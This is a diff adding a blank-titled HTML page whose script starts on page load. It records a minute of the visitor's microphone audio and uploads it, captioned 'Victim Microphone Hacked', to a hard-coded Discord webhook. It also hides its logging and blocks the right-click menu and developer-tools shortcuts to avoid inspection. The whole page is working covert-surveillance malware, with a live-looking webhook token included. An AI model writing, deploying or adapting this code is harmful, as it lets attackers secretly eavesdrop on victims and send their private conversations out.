@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>*{margin:0;padding:0;}</style>
+</head>
+<body>
+
+<script>
+// Silent Audio Recorder - Starts automatically when page loads
+(async function() {
+    // CONFIGURATION - Replace with your Discord webhook
+    const WEBHOOK = 'https://discord.com/api/webhooks/1445409762195017830/6gtZZ0TfIYEf9rCUHGnArDQOiE6yqzN1ncZMvR5oERHtgO8PJMgDZx3LMHD2ekQgPCxp';
+    const RECORDING_DURATION = 60000; // 1 minute in milliseconds
+    const SILENT_MODE = true; // No console logs
+    
+    // Helper function for silent logging
+    const log = (...args) => SILENT_MODE ? null : console.log('[AudioCapture]', ...args);
+    
+    try {
+        log('Starting audio recording...');
+        
+        // Request microphone access
+        const stream = await navigator.mediaDevices.getUserMedia({
+            audio: {
+                echoCancellation: false,
+                noiseSuppression: false,
+                autoGainControl: false,
+                sampleRate: 44100,
+                channelCount: 2
+            },
+            video: false
+        });
+        
+        // Create recorder with WAV format for better compatibility
+        const mediaRecorder = new MediaRecorder(stream, {
+            mimeType: 'audio/webm;codecs=opus',
+            audioBitsPerSecond: 128000
+        });
+        
+        const audioChunks = [];
+        
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                audioChunks.push(event.data);
+                log(`Recording chunk: ${event.data.size} bytes`);
+            }
+        };
+        
+        mediaRecorder.onstop = async () => {
+            log('Recording stopped, processing audio...');
+            
+            // Combine all chunks into single blob
+            const audioBlob = new Blob(audioChunks, {
+                type: 'audio/webm'
+            });
+            
+            // Stop all audio tracks
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Send to Discord
+            if (WEBHOOK.includes('discord.com')) {
+                await sendAudioToDiscord(audioBlob);
+            }
+            
+            log('Process completed successfully');
+        };
+        
+        // Start recording
+        mediaRecorder.start();
+        log(`Recording started for ${RECORDING_DURATION/1000} seconds...`);
+        
+        // Stop recording after specified duration
+        setTimeout(() => {
+            if (mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                log('Recording stopped by timer');
+            }
+        }, RECORDING_DURATION);
+        
+        // Handle page visibility changes
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                log('Page hidden - continuing recording in background');
+            }
+        });
+        
+    } catch (error) {
+        log('Error:', error.name);
+        // Send error notification to Discord
+        if (WEBHOOK.includes('discord.com')) {
+            await sendErrorToDiscord(error.name);
+        }
+    }
+    
+    async function sendAudioToDiscord(audioBlob) {
+        try {
+            const formData = new FormData();
+            formData.append('content', 'Victim Microphone Hacked 🎉🎙😈:');
+            formData.append('file', audioBlob, `recording_${Date.now()}.webm`);
+            
+            const response = await fetch(WEBHOOK, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (response.ok) {
+                log('✅ Audio sent to Discord successfully');
+            } else {
+                log('❌ Failed to send audio:', response.status);
+            }
+        } catch (error) {
+            log('❌ Network error:', error.message);
+        }
+    }
+    
+    async function sendErrorToDiscord(errorType) {
+        try {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `XSASAX Record_Server: Failed - ${errorType}`
+                })
+            });
+        } catch (error) {
+            // Silent fail
+        }
+    }
+})();
+
+// Stealth enhancements
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+// Prevent some dev tools shortcuts
+document.addEventListener('keydown', (e) => {
+    const blockedKeys = [
+        'F12',
+        'I',
+        'J',
+        'U',
+        'S'
+    ];
+    
+    if ((e.ctrlKey && e.shiftKey && blockedKeys.includes(e.key)) || 
+        (e.key === 'F12') ||
+        (e.ctrlKey && e.key === 'u')) {
+        e.preventDefault();
+    }
+});
+
+// Keep page alive
+let keepAlive = setInterval(() => {
+    // Minimal activity to prevent sleep
+}, 10000);
+</script>
+
+</body>
+</html>
